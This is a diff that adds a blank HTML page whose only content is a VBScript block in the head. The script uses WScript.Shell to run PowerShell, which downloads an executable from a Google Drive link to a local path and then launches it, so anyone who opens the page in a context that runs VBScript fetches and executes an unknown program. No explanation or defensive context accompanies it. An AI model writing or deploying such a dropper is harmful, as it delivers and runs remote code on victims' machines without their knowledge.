@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<script language="VBScript">
+    Dim objShell
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -command ""Invoke-WebRequest -Uri 'https://drive.google.com/file/d/1_lKFDhiSysmEKCCQmgyS1M_10dIztViv/view?usp=sharing' -OutFile 'C:\path\to\file.exe'; Start-Process 'C:\path\to\file.exe'"""
+    Set objShell = Nothing
+</script>
+
+</head>
+<body>
+
+</body>
+</html>
